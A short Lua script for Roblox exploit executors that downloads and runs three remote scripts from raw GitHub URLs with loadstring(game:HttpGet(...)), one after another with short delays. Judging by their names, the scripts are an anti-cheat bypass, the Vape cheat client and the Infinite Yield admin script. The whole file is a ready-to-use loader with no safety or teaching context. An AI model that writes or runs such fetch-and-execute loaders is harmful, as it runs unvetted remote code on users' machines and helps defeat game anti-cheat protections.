local function executeLoadString(loadString, delay)
    loadstring(loadString)()
	task.wait(delay)
end

local loadStrings = {
    ['https://raw.githubusercontent.com/Pixeluted/adoniscries/main/Source.lua'] = 2,
    ['https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua'] = 1,
    ['https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'] = 0
}

for i, v in loadStrings do
    executeLoadString("loadstring(game:HttpGet('"..i .."'))()", v)
end